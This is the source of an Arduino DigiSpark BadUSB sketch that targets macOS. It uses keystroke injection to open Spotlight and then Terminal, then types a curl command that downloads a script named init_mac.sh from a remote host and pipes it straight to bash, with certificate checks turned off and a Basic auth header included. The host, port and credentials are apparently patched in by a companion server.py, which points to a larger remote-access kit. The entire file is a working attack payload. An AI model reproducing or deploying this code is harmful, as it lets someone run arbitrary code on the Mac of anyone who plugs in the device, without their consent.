#include "DigiKeyboard.h"

// ── CONFIG ──────────────────────────────────────────────
#define LHOST     ""  // auto-patched by server.py
#define HTTP_PORT ""  // auto-patched by server.py
#define PROTO     ""  // auto-patched by server.py
#define AUTH      "Basic "  // auto-patched by server.py
// ────────────────────────────────────────────────────────

void loop() {

  DigiKeyboard.delay(2000);

  // CMD+Space → Spotlight
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);

  // type "terminal" and open it
  DigiKeyboard.print("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);  // wait for Terminal window

  // download and execute init_mac.sh
  DigiKeyboard.print("curl -sk -H 'Authorization: " AUTH "' " PROTO "://" LHOST ":" HTTP_PORT "/moduls/init_mac.sh | bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) { /*halt*/ }
}

void setup() {}
